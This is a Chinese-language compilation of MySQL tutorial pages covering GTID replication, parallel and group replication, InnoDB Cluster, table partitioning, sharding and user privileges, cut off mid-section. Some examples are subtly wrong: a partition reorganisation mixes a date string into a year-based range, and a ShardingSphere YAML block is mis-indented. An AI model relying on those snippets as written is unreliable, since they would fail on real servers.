 SELECT * FROM monthly_growth ORDER BY month DESC;
 with RECURSIVE dept_hierarchy AS (
  SELECT
  dept_id,
  dept_name,
  parent_dept_id,
  1 as level
  FROM departments
  WHERE parent_dept_id IS NULL
  UNION ALL
  SELECT
  d.dept_id,
  d.dept_name,
  d.parent_dept_id,
  dh.level + 1 as level
  FROM departments d
  JOIN dept_hierarchy dh ON d.parent_dept_id = dh.dept_id
 )
 SELECT * FROM dept_hierarchy ORDER BY level, dept_id;
```

<!-- ============ 文档分隔线：020-mysql/044-GTID.md ============ -->

## 1. GTID 概述

全局事务标识符（Global Transaction Identifier，GTID）为每个事务分配唯一标识，简化复制管理。

### 1.1 GTID 格式

$$
\text{GTID} = \text{server\_uuid}:\text{transaction\_id}
$$

```
3E11FA47-71CA-11E1-9E33-C80AA9429562:1-5
```

## 2. 配置

```ini
[mysqld]
gtid-mode = ON
enforce-gtid-consistency = ON
log-bin = mysql-bin
binlog-format = ROW
server-id = 1
```

## 3. 基于GTID的复制

```sql
-- 从库配置（无需指定 binlog 位置）
CHANGE MASTER TO
    MASTER_HOST = 'master-ip',
    MASTER_USER = 'repl',
    MASTER_PASSWORD = 'password',
    MASTER_AUTO_POSITION = 1;  -- 使用 GTID 自动定位

START SLAVE;
```

## 4. GTID 运维

```sql
-- 查看已执行的 GTID
SHOW MASTER STATUS;
-- Executed_Gtid_Set: 3E11FA47-71CA-11E1-9E33-C80AA9429562:1-100

-- 查看从库已执行的 GTID
SHOW SLAVE STATUS\G
-- Retrieved_Gtid_Set: ...
-- Executed_Gtid_Set: ...

-- 跳过有问题的 GTID 事务
SET GTID_NEXT = '3E11FA47-71CA-11E1-9E33-C80AA9429562:101';
BEGIN;
COMMIT;
SET GTID_NEXT = AUTOMATIC;
START SLAVE;
```

## 5. GTID 优势

- 无需手动定位 binlog 位置
- 故障切换更简单
- 可验证主从数据一致性
- 支持多源复制
## GTID 概念与格式

**基本写法：标准 GTID 格式**
`<server_uuid>:<事务序号>`

```sql
-- 标准 GTID 格式示例
-- 3E11FA47-71CA-11E1-9E33-C80AA9429562:1-5
-- 表示该 UUID 的事务 1 到 5

-- 8.4 Tagged GTID 格式（带标签）
-- 3E11FA47-71CA-11E1-9E33-C80AA9429562:1-5:delete_logs
```

**基本写法：查看服务器 UUID**
`SHOW VARIABLES LIKE 'server_uuid';`

```sql
-- 查看当前服务器 UUID
SHOW VARIABLES LIKE 'server_uuid';
```

---

## GTID 开启与配置

**基本写法：查看 GTID 状态**
`SHOW VARIABLES LIKE 'gtid_mode';`

```sql
-- 查看 GTID 是否启用
SHOW VARIABLES LIKE 'gtid_mode';
SHOW VARIABLES LIKE 'enforce_gtid_consistency';
```

**基本写法：在线开启 GTID（分步）**
`SET GLOBAL enforce_gtid_consistency = WARN;`

```sql
-- 第一步：开启一致性警告，观察业务无警告后继续
SET GLOBAL enforce_gtid_consistency = WARN;
-- 第二步：开启一致性强制
SET GLOBAL enforce_gtid_consistency = ON;
-- 第三步：GTID 模式 OFF_PERMISSIVE（允许混合）
SET GLOBAL gtid_mode = OFF_PERMISSIVE;
-- 第四步：ON_PERMISSIVE（允许混合）
SET GLOBAL gtid_mode = ON_PERMISSIVE;
-- 等待所有匿名事务消费完毕
SHOW STATUS LIKE 'Ongoing_anonymous_transaction_count';
-- 第五步：正式开启
SET GLOBAL gtid_mode = ON;
```

**基本写法：配置文件持久开启**
`gtid_mode = ON`

```ini
# my.cnf 持久配置
[mysqld]
gtid_mode = ON
enforce_gtid_consistency = ON
log_slave_updates = ON        # 8.0.10+ 默认 ON，副本需记录更新到 binlog
log_bin = mysql-bin
```

---

## GTID 查询

**基本写法：查看已执行 GTID**
`SELECT @@GLOBAL.gtid_executed;`

```sql
-- 查看当前服务器已执行的 GTID 集合
SELECT @@GLOBAL.gtid_executed;
-- 示例输出: 3E11FA47-71CA-11E1-9E33-C80AA9429562:1-100
```

**基本写法：查看已清除 GTID**
`SELECT @@GLOBAL.gtid_purged;`

```sql
-- 查看已被清除（不可用）的 GTID 集合
SELECT @@GLOBAL.gtid_purged;
```

**基本写法：查看 GTID 执行状态**
`SHOW MASTER STATUS;`

```sql
-- 查看当前二进制日志位置与已执行 GTID（8.4 用 SHOW BINARY LOG STATUS）
SHOW BINARY LOG STATUS\G
-- 输出包含 Executed_Gtid_Set 字段
```

**基本写法：performance_schema 查询 GTID**
`SELECT * FROM performance_schema.replication_connection_status;`

```sql
-- 查看复制连接接收到的 GTID
SELECT thread_id, service_state, received_transaction_set
FROM performance_schema.replication_connection_status;
```

---

## GTID 复制配置

**基本写法：基于 GTID 建立复制**
`CHANGE REPLICATION SOURCE TO SOURCE_HOST='<主机>', SOURCE_USER='<用户>', SOURCE_PASSWORD='<密码>', SOURCE_AUTO_POSITION = 1;`

```sql
-- GTID 自动定位复制（无需指定日志文件和位置）
CHANGE REPLICATION SOURCE TO
  SOURCE_HOST='192.168.1.100',
  SOURCE_PORT=3306,
  SOURCE_USER='repl',
  SOURCE_PASSWORD='ReplPass123!',
  SOURCE_AUTO_POSITION = 1,
  GET_SOURCE_PUBLIC_KEY = 1;
START REPLICA;
```

**基本写法：跳过指定 GTID 事务**
`SET GTID_NEXT = '<GTID>';`

```sql
-- 跳过单个 GTID 事务（解决复制错误）
STOP REPLICA;
SET GTID_NEXT = '3E11FA47-71CA-11E1-9E33-C80AA9429562:101';
BEGIN; COMMIT;
SET GTID_NEXT = AUTOMATIC;
START REPLICA;
```

**基本写法：设置已清除 GTID（空库初始化）**
`SET GLOBAL gtid_purged = '<GTID集合>';`

```sql
-- 从备份恢复空库时设置已清除的 GTID
SET GLOBAL gtid_purged = '3E11FA47-71CA-11E1-9E33-C80AA9429562:1-100';
```

---

## 8.4 Tagged GTID

**基本写法：为事务打标签**
`SET TRANSACTION GTID_TAG = '<标签名>';`

```sql
-- MySQL 8.4 新特性：为事务分配标签（最多 33 字符）
-- 需 TRANSACTION_GTID_TAG 权限
SET TRANSACTION GTID_TAG = 'delete_logs';
DELETE FROM logs WHERE created_at < NOW() - INTERVAL 30 DAY;
```

**基本写法：会话级设置标签**
`SET SESSION gtid_next_tag = '<标签名>';`

```sql
-- 当前会话所有事务都打上标签
SET SESSION gtid_next_tag = 'batch_import';
INSERT INTO sales VALUES (...);
```

**基本写法：跳过指定标签的事务**
`SET GLOBAL gtid_purged = '<UUID>:<区间>:<标签>';`

```sql
-- 副本端跳过带标签的事务（8.4 新增三参数 gtid_purged）
-- 格式: SET GLOBAL gtid_purged=<group_name>, <gtid_set>, <tag>
SET GLOBAL gtid_purged = '3E11FA47-71CA-11E1-9E33-C80AA9429562:1-100:delete_logs';
```

**基本写法：查看带标签的 GTID**
`SELECT * FROM performance_schema.replication_applier_status_by_worker;`

```sql
-- 查看副本应用事务时是否包含标签信息
SELECT worker_id, last_applied_transaction, last_applied_transaction_original_seqno
FROM performance_schema.replication_applier_status_by_worker;
```

---

## GTID 复制错误处理

**基本写法：查看复制错误**
`SHOW REPLICA STATUS\G`

```sql
-- 查看复制错误信息
SHOW REPLICA STATUS\G
-- 关注 Last_Error 与 Last_SQL_Error 字段
```

**基本写法：基于 GTID 自动跳过错误**
`SET GLOBAL slave_skip_errors = '<错误码>';`

```sql
-- 不推荐：跳过指定错误码（破坏一致性）
-- 推荐：使用 GTID_NEXT 手动跳过或 sql_slave_skip_counter（仅非 GTID）
```

**基本写法：重置 GTID 执行状态**
`RESET MASTER;`

```sql
-- 清空所有 binlog 并重置 gtid_executed（危险！仅初始化时使用）
RESET MASTER;
```

<!-- ============ 文档分隔线：020-mysql/045-ParallelReplication.md ============ -->

## 1. 并行复制概述

MySQL 从库默认单线程回放 relay log，高并发写入时容易产生延迟。并行复制允许多线程同时回放事务。

## 2. 并行复制策略

### 2.1 库级并行（MySQL 5.6）

```sql
-- 按数据库并行回放
SET GLOBAL slave_parallel_type = DATABASE;
SET GLOBAL slave_parallel_workers = 4;
-- 不同数据库的事务可以并行回放
-- 单库场景无效果
```

### 2.2 逻辑时钟（MySQL 5.7）

```sql
-- 基于组提交的并行回放
SET GLOBAL slave_parallel_type = LOGICAL_CLOCK;
SET GLOBAL slave_parallel_workers = 4;

-- 同一组提交的事务可以并行回放
-- 主库 binlog_group_commit_sync_delay 影响分组
SET GLOBAL binlog_group_commit_sync_delay = 1000;  -- 1ms延迟增加组大小
SET GLOBAL binlog_group_commit_sync_no_delay_count = 10;
```

### 2.3 写集并行（MySQL 8.0）

```sql
-- 基于写集（writeset）的更细粒度并行
SET GLOBAL transaction_write_set_extraction = XXHASH64;
SET GLOBAL binlog_transaction_dependency_tracking = WRITESET;
SET GLOBAL slave_parallel_workers = 8;

-- 不修改同一行的事务可以并行回放
-- 粒度最细，效果最好
```

## 3. 监控

```sql
-- 查看并行复制状态
SHOW SLAVE STATUS\G
-- Slave_SQL_Running_State: System lock

-- 查看工作线程状态
SELECT * FROM performance_schema.replication_applier_status_by_worker;
```

<!-- ============ 文档分隔线：020-mysql/046-GroupReplication.md ============ -->

## 1. 组复制概述

MySQL Group Replication（MGR）基于 Paxos 协议实现多主一致性复制，提供自动故障检测和切换。

### 1.1 模式

| 模式     | 写入点   | 适用场景   |
| -------- | -------- | ---------- |
| 单主模式 | 仅主节点 | 大多数场景 |
| 多主模式 | 所有节点 | 写分散场景 |

## 2. 配置

```ini
[mysqld]
server-id = 1
gtid-mode = ON
enforce-gtid-consistency = ON
log-bin = mysql-bin
binlog-format = ROW
master-info-repository = TABLE
relay-log-info-repository = TABLE

# 组复制配置
plugin_load_add = 'group_replication.so'
group_replication_group_name = '3E11FA47-71CA-11E1-9E33-C80AA9429562'
group_replication_start_on_boot = OFF
group_replication_local_address = 'node1:33061'
group_replication_group_seeds = 'node1:33061,node2:33061,node3:33061'
group_replication_single_primary_mode = ON
```

## 3. 启动组复制

```sql
-- 首个节点（引导组）
SET SQL_LOG_BIN = 0;
CREATE USER 'repl'@'%' IDENTIFIED BY 'password';
GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';
SET SQL_LOG_BIN = 1;
CHANGE MASTER TO MASTER_USER='repl', MASTER_PASSWORD='password' FOR CHANNEL 'group_replication_recovery';

SET GLOBAL group_replication_bootstrap_group = ON;
START GROUP_REPLICATION;
SET GLOBAL group_replication_bootstrap_group = OFF;

-- 其他节点加入
START GROUP_REPLICATION;

-- 查看成员
SELECT * FROM performance_schema.replication_group_members;
```

## 4. 故障检测

```sql
-- 自动检测故障节点
-- 多数节点同意后剔除故障节点
-- 单主模式下自动选举新主

-- 查看当前主节点
SELECT * FROM performance_schema.replication_group_members
WHERE MEMBER_ROLE = 'PRIMARY';
```

<!-- ============ 文档分隔线：020-mysql/047-InnoDBCluster.md ============ -->

## 1. InnoDB Cluster 概述

InnoDB Cluster 是 MySQL 官方的高可用方案，整合三个组件：

| 组件                             | 作用               |
| -------------------------------- | ------------------ |
| MySQL Server + Group Replication | 数据复制与一致性   |
| MySQL Router                     | 读写路由与故障转移 |
| MySQL Shell                      | 管理与配置工具     |

## 2. 部署

### 2.1 使用 MySQL Shell 创建集群

```javascript
// 连接主节点
mysqlsh root@node1:3306

// 创建集群
var cluster = dba.createCluster('myCluster');

// 添加实例
cluster.addInstance('root@node2:3306');
cluster.addInstance('root@node3:3306');

// 查看集群状态
cluster.status();
```

### 2.2 配置 MySQL Router

```bash
# 引导 Router
mysqlrouter --bootstrap root@node1:3306 --user=mysqlrouter

# 启动 Router
systemctl start mysqlrouter

# 应用连接 Router
# 读写端口：6446（指向主节点）
# 只读端口：6447（指向从节点）
mysql -h 127.0.0.1 -P 6446 -u root -p  # 读写
mysql -h 127.0.0.1 -P 6447 -u root -p  # 只读
```

## 3. InnoDB ClusterSet

### 3.1 概述

ClusterSet 将多个 InnoDB Cluster 连接起来，提供跨数据中心的高可用和灾难恢复。

```javascript
// 创建 ClusterSet
var clusterset = dba.createClusterSet('myClusterSet');

// 添加副本集群
clusterset.createReplicaCluster('root@replica-node1:3306', 'replicaCluster');

// 查看状态
clusterset.status();
```

### 3.2 故障切换

```javascript
// 强制切换到副本集群
clusterset.forcePrimaryCluster('replicaCluster');
```

<!-- ============ 文档分隔线：020-mysql/048-PartitionedTable.md ============ -->

## 1. 分区概述

分区将大表拆分为多个物理小表，对应用透明，用于提升查询性能和管理便利性。

## 2. RANGE 分区

```sql
CREATE TABLE orders (
    id BIGINT AUTO_INCREMENT,
    order_date DATE,
    amount DECIMAL(10,2),
    PRIMARY KEY (id, order_date)
) PARTITION BY RANGE (YEAR(order_date)) (
    PARTITION p2024 VALUES LESS THAN (2025),
    PARTITION p2025 VALUES LESS THAN (2026),
    PARTITION p2026 VALUES LESS THAN (2027),
    PARTITION pmax VALUES LESS THAN MAXVALUE
);

-- 添加分区
ALTER TABLE orders ADD PARTITION (PARTITION p2027 VALUES LESS THAN (2028));

-- 删除分区（数据也删除）
ALTER TABLE orders DROP PARTITION p2024;
```

## 3. LIST 分区

```sql
CREATE TABLE customers (
    id BIGINT AUTO_INCREMENT,
    region VARCHAR(20),
    name VARCHAR(100),
    PRIMARY KEY (id, region)
) PARTITION BY LIST COLUMNS (region) (
    PARTITION p_east VALUES IN ('华东', '华北'),
    PARTITION p_south VALUES IN ('华南', '西南'),
    PARTITION p_north VALUES IN ('东北', '西北')
);
```

## 4. HASH 分区

```sql
CREATE TABLE logs (
    id BIGINT AUTO_INCREMENT,
    created_at TIMESTAMP,
    message TEXT,
    PRIMARY KEY (id, created_at)
) PARTITION BY HASH (YEAR(created_at))
PARTITIONS 4;
```

## 5. KEY 分区

```sql
CREATE TABLE sessions (
    session_id VARCHAR(128) PRIMARY KEY,
    user_id BIGINT,
    data TEXT
) PARTITION BY KEY (session_id)
PARTITIONS 8;
```

## 6. 分区裁剪

```sql
-- 查询只扫描相关分区
SELECT * FROM orders WHERE order_date >= '2026-01-01';
-- 只扫描 p2026 分区

-- 查看分区裁剪
EXPLAIN PARTITIONS
SELECT * FROM orders WHERE order_date >= '2026-01-01';
-- partitions: p2026
```

## 7. 分区管理

```sql
-- 重建分区（消除碎片）
ALTER TABLE orders REBUILD PARTITION p2026;

-- 分析分区（更新统计信息）
ALTER TABLE orders ANALYZE PARTITION p2026;

-- 优化分区
ALTER TABLE orders OPTIMIZE PARTITION p2026;

-- 检查分区
ALTER TABLE orders CHECK PARTITION p2026;
```
## RANGE 分区

**基本写法：RANGE 分区建表**
`CREATE TABLE <表名> (...) PARTITION BY RANGE (<表达式>) (PARTITION <分区名> VALUES LESS THAN (<值>), ...)`

```sql
-- 按年份范围分区
CREATE TABLE orders (
  id BIGINT PRIMARY KEY,
  order_date DATE,
  amount DECIMAL(10,2)
)
PARTITION BY RANGE (YEAR(order_date)) (
  PARTITION p2022 VALUES LESS THAN (2023),
  PARTITION p2023 VALUES LESS THAN (2024),
  PARTITION p2024 VALUES LESS THAN (2025),
  PARTITION pmax VALUES LESS THAN MAXVALUE
);
```

**基本写法：RANGE COLUMNS 多列分区**
`PARTITION BY RANGE COLUMNS(<列1>, <列2>) (PARTITION <名> VALUES LESS THAN (<值1>, <值2>), ...)`

```sql
-- 按多列组合范围分区
CREATE TABLE sales (
  id BIGINT,
  region VARCHAR(20),
  sale_date DATE
)
PARTITION BY RANGE COLUMNS(region, sale_date) (
  PARTITION p_east_2024 VALUES LESS THAN ('EAST', '2025-01-01'),
  PARTITION p_west_2024 VALUES LESS THAN ('WEST', '2025-01-01'),
  PARTITION p_other VALUES LESS THAN (MAXVALUE, MAXVALUE)
);
```

---

## LIST 分区

**基本写法：LIST 分区建表**
`CREATE TABLE <表名> (...) PARTITION BY LIST (<表达式>) (PARTITION <分区名> VALUES IN (<值列表>), ...)`

```sql
-- 按地区枚举分区
CREATE TABLE customers (
  id BIGINT PRIMARY KEY,
  region_code INT
)
PARTITION BY LIST (region_code) (
  PARTITION p_north VALUES IN (1, 2, 3),
  PARTITION p_south VALUES IN (4, 5, 6),
  PARTITION p_east VALUES IN (7, 8),
  PARTITION p_west VALUES IN (9, 10)
);
```

**基本写法：LIST COLUMNS 多列分区**
`PARTITION BY LIST COLUMNS(<列>) (PARTITION <名> VALUES IN (<值列表>), ...)`

```sql
-- 按字符串列分区
CREATE TABLE users (
  id BIGINT,
  country VARCHAR(10)
)
PARTITION BY LIST COLUMNS(country) (
  PARTITION p_cn VALUES IN ('CN', 'HK', 'TW'),
  PARTITION p_us VALUES IN ('US', 'CA'),
  PARTITION p_other VALUES IN ('UK', 'FR', 'DE')
);
```

---

## HASH 与 KEY 分区

**基本写法：HASH 分区**
`CREATE TABLE <表名> (...) PARTITION BY HASH(<表达式>) PARTITIONS <分区数>;`

```sql
-- 按用户 ID 哈希分 8 个区
CREATE TABLE user_logs (
  id BIGINT,
  user_id BIGINT,
  log_text TEXT
)
PARTITION BY HASH(user_id)
PARTITIONS 8;
```

**基本写法：LINEAR HASH 分区**
`PARTITION BY LINEAR HASH(<表达式>) PARTITIONS <分区数>;`

```sql
-- 线性哈希，增删分区更快但分布可能不均
CREATE TABLE t_logs (id BIGINT)
PARTITION BY LINEAR HASH(id)
PARTITIONS 16;
```

**基本写法：KEY 分区**
`PARTITION BY KEY(<列>) PARTITIONS <分区数>;`

```sql
-- KEY 分区由 MySQL 内部哈希，类似主键哈希
CREATE TABLE user_events (
  id BIGINT PRIMARY KEY,
  event VARCHAR(50)
)
PARTITION BY KEY()
PARTITIONS 4;
```

---

## 分区管理

**基本写法：添加分区**
`ALTER TABLE <表名> ADD PARTITION (PARTITION <分区名> VALUES LESS THAN (<值>));`

```sql
-- 为 RANGE 分区表添加新分区
ALTER TABLE orders
ADD PARTITION (
  PARTITION p2025 VALUES LESS THAN (2026)
);
```

**基本写法：删除分区**
`ALTER TABLE <表名> DROP PARTITION <分区名>;`

```sql
-- 删除分区（连同数据一起删除）
ALTER TABLE orders DROP PARTITION p2022;
```

**基本写法：重组分区**
`ALTER TABLE <表名> REORGANIZE PARTITION <分区名> INTO (PARTITION <新分区> ...);`

```sql
-- 将 p2024 拆分为 p2024_h1 和 p2024_h2
ALTER TABLE orders
REORGANIZE PARTITION p2024 INTO (
  PARTITION p2024_h1 VALUES LESS THAN ('2024-07-01'),
  PARTITION p2024_h2 VALUES LESS THAN (2025)
);
```

**基本写法：合并分区**
`ALTER TABLE <表名> REORGANIZE PARTITION <分区1>, <分区2> INTO (PARTITION <新分区> ...);`

```sql
-- 合并两个相邻分区
ALTER TABLE orders
REORGANIZE PARTITION p2024_h1, p2024_h2 INTO (
  PARTITION p2024 VALUES LESS THAN (2025)
);
```

---

## 分区维护

**基本写法：查看分区信息**
`SELECT * FROM information_schema.PARTITIONS WHERE table_name = '<表名>';`

```sql
-- 查看表分区、行数、数据长度
SELECT partition_name, partition_method, table_rows, data_length
FROM information_schema.PARTITIONS
WHERE table_name = 'orders';
```

**基本写法：检查分区**
`ALTER TABLE <表名> CHECK PARTITION <分区名>;`

```sql
-- 检查指定分区数据完整性
ALTER TABLE orders CHECK PARTITION p2024;
```

**基本写法：重建分区**
`ALTER TABLE <表名> REBUILD PARTITION <分区名>;`

```sql
-- 重建分区回收碎片
ALTER TABLE orders REBUILD PARTITION p2023;
```

**基本写法：分析分区**
`ALTER TABLE <表名> ANALYZE PARTITION <分区名>;`

```sql
-- 重新收集分区统计信息
ALTER TABLE orders ANALYZE PARTITION p2024;
```

**基本写法：移除分区（保留数据）**
`ALTER TABLE <表名> REMOVE PARTITIONING;`

```sql
-- 移除分区结构但保留数据为普通表
ALTER TABLE orders REMOVE PARTITIONING;
```

<!-- ============ 文档分隔线：020-mysql/049-ShardingMiddleware.md ============ -->

## 1. 分库分表概述

当单表数据量超过千万级，单库性能瓶颈时，需要分库分表。

### 1.1 拆分策略

| 策略     | 说明                       | 适用场景     |
| -------- | -------------------------- | ------------ |
| 垂直分库 | 按业务拆分到不同数据库     | 微服务架构   |
| 垂直分表 | 将大表拆分为多张小表       | 列数过多的表 |
| 水平分库 | 同一表数据分布到多个数据库 | 数据量大的表 |
| 水平分表 | 同一库中将表拆分为多张子表 | 数据量大的表 |

## 2. 分片键设计

```sql
-- 分片键选择原则：
-- 1. 高选择性（避免数据倾斜）
-- 2. 查询高频使用
-- 3. 尽量避免跨分片查询

-- 常见分片策略：
-- user_id % 4 → 4个分片
-- HASH(order_id) → 均匀分布
-- RANGE(created_at) → 按时间分片
```

## 3. ShardingSphere

### 3.1 架构

```
ShardingSphere-JDBC：轻量级Java框架，应用内嵌入
ShardingSphere-Proxy：独立代理服务
ShardingSphere-Sidecar：云原生方案
```

### 3.2 分片配置

```yaml
rules:
  - !SHARDING
    tables:
      orders:
        actualDataNodes: ds_${0..3}.orders_${0..7}
        tableStrategy:
          standard:
            shardingColumn: user_id
            shardingAlgorithmName: orders_mod
        keyGenerateStrategy:
          column: id
            keyGeneratorName: snowflake
    shardingAlgorithms:
      orders_mod:
        type: MOD
        props:
          sharding-count: 8
```

## 4. Vitess

```sql
-- Vitess：YouTube 开源的 MySQL 集群管理工具
-- 基于 VReplication 实现分片迁移
-- 支持在线分片拆分和合并

-- 创建分片
vtctlclient CreateShard -keyspace commerce -shard '-'
vtctlclient CreateShard -keyspace commerce -shard '-80'
vtctlclient CreateShard -keyspace commerce -shard '80-'
```

## 5. 跨分片查询

```sql
-- 尽量避免跨分片 JOIN 和聚合
-- 使用冗余字段减少跨分片查询
-- 使用全局表（广播表）存储维度数据
-- 使用 ER 分片将关联表放在同一分片
```

<!-- ============ 文档分隔线：020-mysql/050-AccountPermissionManagement.md ============ -->

## 1. 用户管理

```sql
-- 创建用户
CREATE USER 'app_user'@'%' IDENTIFIED BY 'StrongP@ss123';
CREATE USER 'readonly'@'10.0.%' IDENTIFIED BY 'password';

-- 修改密码
ALTER USER 'app_user'@'%' IDENTIFIED BY 'NewP@ss456';

-- 删除用户
DROP USER 'app_user'@'%';

-- 查看用户
SELECT user, host FROM mysql.user;
```

## 2. 权限管理

```sql
-- 授予权限
GRANT SELECT, INSERT ON mydb.* TO 'app_user'@'%';
GRANT ALL PRIVILEGES ON mydb.* TO 'admin'@'localhost';

-- 撤销权限
REVOKE INSERT ON mydb.* FROM 'app_user'@'%';

-- 查看权限
SHOW GRANTS FOR 'app_user'@'%';
```

## 3. 角色（MySQL 8.0+）

```sql
-- 创建角色
CREATE ROLE 'app_read', 'app_write', 'app_admin';

-- 授予角色权限
GRANT SELECT ON mydb.* TO 'app_read';
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'app_write';
GRANT ALL PRIVILEGES ON mydb.* TO 'app_admin';

-- 将角色分配给用户
GRANT 'app_read' TO 'reporting_user'@'%';
GRANT 'app_write' TO 'application_user'@'%';

-- 激活角色
SET DEFAULT ROLE ALL TO 'reporting_user'@'%';
```

## 4. 密码策略

```sql
-- MySQL 8.0 密码验证插件
INSTALL COMPONENT 'file://component_validate_password';
SET GLOBAL validate_password.policy = MEDIUM;
SET GLOBAL validate_password.length = 12;
SET GLOBAL validate_password.mixed_case_count = 1;
SET GLOBAL validate_password.number_count = 1;
SET GLOBAL validate_password.special_char_count = 1;

-- 密码过期
ALTER USER 'app_user'@'%' PASSWORD EXPIRE INTERVAL 90 DAY;
ALTER USER 'app_user'@'%' PASSWORD EXPIRE NEVER;
```

## 5. 连接安全

```sql
-- 限制最大连接数
ALTER USER 'app_user'@'%' WITH MAX_CONNECTIONS_PER_HOUR 100;

-- 限制查询数
ALTER USER 'app_user'@'%' WITH MAX_QUERIES_PER_HOUR 1000;

-- 锁定账户
ALTER USER 'app_user'@'%' ACCOUNT LOCK;
ALTER USER 'app_user'@'%' ACCOUNT UNLOCK;
```
## 用户管理

**单行写法：创建用户允许任意主机连接**
`CREATE USER '<用户名>'@'%' IDENTIFIED BY '<密码>'`
```sql
-- 创建允许任意主机连接的用户
CREATE USER 'app_user'@'%' IDENTIFIED BY 'StrongP@ss123';
```

**单行写法：创建用户限制来源 IP 段**
`CREATE USER '<用户名>'@'<IP 段>' IDENTIFIED BY '<密码>'`
```sql
-- 创建限制来源 IP 段的用户
CREATE USER 'readonly'@'10.0.%' IDENTIFIED BY 'password';
```

**单行写法：修改用户密码**
`ALTER USER '<用户名>'@'<主机>' IDENTIFIED BY '<新密码>'`
```sql
-- 修改用户密码
ALTER USER 'app_user'@'%' IDENTIFIED BY 'NewP@ss456';
```

**单行写法：删除用户**
`DROP USER '<用户名>'@'<主机>'`
```sql
-- 删除指定用户
DROP USER 'app_user'@'%';
```

**单行写法：查看所有用户**
`SELECT user, host FROM mysql.user`
```sql
-- 查看所有用户列表
SELECT user, host FROM mysql.user;
```

---

## 权限管理

**单行写法：授予查询和插入权限**
`GRANT <权限列表> ON <库>.<表> TO '<用户名>'@'<主机>'`
```sql
-- 授予查询和插入权限
GRANT SELECT, INSERT ON mydb.* TO 'app_user'@'%';
```

**单行写法：授予所有权限**
`GRANT ALL PRIVILEGES ON <库>.<表> TO '<用户名>'@'<主机>'`
```sql
-- 授予所有权限
GRANT ALL PRIVILEGES ON mydb.* TO 'admin'@'localhost';
```

**单行写法：撤销权限**
`REVOKE <权限列表> ON <库>.<表> FROM '<用户名>'@'<主机>'`
```sql
-- 撤销插入权限
REVOKE INSERT ON mydb.* FROM 'app_user'@'%';
```

**单行写法：查看用户权限**
`SHOW GRANTS FOR '<用户名>'@'<主机>'`
```sql
-- 查看用户权限
SHOW GRANTS FOR 'app_user'@'%';
```

**单行写法：刷新权限**
`FLUSH PRIVILEGES`
```sql
-- 刷新权限表
FLUSH PRIVILEGES;
```

---

## 角色管理

**单行写法：创建多个角色**
`CREATE ROLE '<角色名>'[, '<角色名>'...]`
```sql
-- 创建多个角色
CREATE ROLE 'app_read', 'app_write', 'app_admin';
```

**单行写法：授予只读角色权限**
`GRANT SELECT ON <库>.<表> TO '<角色名>'`
```sql
-- 授予只读角色权限
GRANT SELECT ON mydb.* TO 'app_read';
```

**单行写法：授予读写角色权限**
`GRANT SELECT, INSERT, UPDATE, DELETE ON <库>.<表> TO '<角色名>'`
```sql
-- 授予读写角色权限
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'app_write';
```

**单行写法：授予管理员角色权限**
`GRANT ALL PRIVILEGES ON <库>.<表> TO '<角色名>'`
```sql
-- 授予管理员角色权限
GRANT ALL PRIVILEGES ON mydb.* TO 'app_admin';
```

**单行写法：将角色分配给用户**
`GRANT '<角色名>' TO '<用户名>'@'<主机>'`
```sql
-- 分配角色给用户
GRANT 'app_read' TO 'reporting_user'@'%';
```

**单行写法：设置用户默认角色**
`SET DEFAULT ROLE ALL TO '<用户名>'@'<主机>'`
```sql
-- 设置用户默认角色
SET DEFAULT ROLE ALL TO 'reporting_user'@'%';
```

**单行写法：撤销用户角色**
`REVOKE '<角色名>' FROM '<用户名>'@'<主机>'`
```sql
-- 撤销用户角色
REVOKE 'app_read' FROM 'reporting_user'@'%';
```

**单行写法：删除角色**
`DROP ROLE '<角色名>'[, '<角色名>'...]`
```sql
-- 删除多个角色
DROP ROLE 'app_read', 'app_write', 'app_admin';
```

---

## 密码策略

**单行写法：安装密码验证组件**
`INSTALL COMPONENT 'file://component_validate_password'`
```sql
-- 安装密码验证组件
INSTALL COMPONENT 'file://component_validate_password';
```

**单行写法：设置密码策略级别**
`SET GLOBAL validate_password.policy = <级别>`
```sql
-- 设置密码策略级别为 MEDIUM
SET GLOBAL validate_password.policy = MEDIUM;
```

**单行写法：设置密码最小长度**
`SET GLOBAL validate_password.length = <长度>`
```sql
-- 设置密码最小长度为 12
SET GLOBAL validate_password.length = 12;
```

**单行写法：设置大小写字母数量**
`SET GLOBAL validate_password.mixed_case_count = <数量>`
```sql
-- 设置密码大小写字母数量为 1
SET GLOBAL validate_password.mixed_case_count = 1;
```

**单行写法：设置数字数量**
`SET GLOBAL validate_password.number_count = <数量>`
```sql
-- 设置密码数字数量为 1
SET GLOBAL validate_password.number_count = 1;
```

**单行写法：设置特殊字符数量**
`SET GLOBAL validate_password.special_char_count = <数量>`
```sql
-- 设置密码特殊字符数量为 1
SET GLOBAL validate_password.special_char_count = 1;
```

**单行写法：密码定期过期**
`ALTER USER '<用户名>'@'<主机>' PASSWORD EXPIRE INTERVAL <天数> DAY`
```sql
-- 设置密码 90 天过期
ALTER USER 'app_user'@'%' PASSWORD EXPIRE INTERVAL 90 DAY;
```

**单行写法：密码永不过期**
`ALTER USER '<用户名>'@'<主机>' PASSWORD EXPIRE NEVER`
```sql
-- 设置密码永不过期
ALTER USER 'app_user'@'%' PASSWORD EXPIRE NEVER;
```

---

## 连接限制

**单行写法：限制每小时最大连接数**
`ALTER USER '<用户名>'@'<主机>' WITH MAX_CONNECTIONS_PER_HOUR <数量>`
```sql
-- 限制每小时最大连接数为 100
ALTER USER 'app_user'@'%' WITH MAX_CONNECTIONS_PER_HOUR 100;
```

**单行写法：限制每小时最大查询数**
`ALTER USER '<用户名>'@'<主机>' WITH MAX_QUERIES_PER_HOUR <数量>`
```sql
-- 限制每小时最大查询数为 1000
ALTER USER 'app_user'@'%' WITH MAX_QUERIES_PER_HOUR 1000;
```

**单行写法：锁定账户**
`ALTER USER '<用户名>'@'<主机>' ACCOUNT LOCK`
```sql
-- 锁定账户
ALTER USER 'app_user'@'%' ACCOUNT LOCK;
```

**单行写法：解锁账户**
`ALTER USER '<用户名>'@'<主机>' ACCOUNT UNLOCK`
```sql
-- 解锁账户
ALTER USER 'app_user'@'%' ACCOUNT UNLOCK;
```

<!-- ============ 文档分隔线：020-mysql/051-SSLEncryption.md ============ -->

## 1. SSL/TLS 概述

MySQL 支持SSL/TLS加密客户端与服务器之间的通信，防止数据在传输中被窃听。

## 2. 配置SSL

### 2.1 自动配置

```sql
-- MySQL 8.0 默认自动生成SSL证书
-- 查看SSL状态
